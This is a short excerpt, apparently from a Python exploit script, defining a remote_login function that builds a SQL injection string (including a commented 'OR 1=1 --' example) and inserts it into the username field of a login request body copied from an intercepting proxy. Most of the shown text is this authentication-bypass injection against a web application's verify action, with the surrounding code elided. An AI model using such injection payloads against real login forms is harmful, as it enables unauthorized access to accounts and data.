...
def remote_login(payload):
    ...
    #pay = " ='1')) OR 1=1 -- 1between".format(payload)
    pay = " ='1')) {} 1between".format(payload)
    print(pay)
    burp0_data = {"act": "verify", "username[0]": pay, "username[1]": "1", "password": "xxxxxxxxxxx", "password": "bbbbbb'", "verify": "DCQFE"}
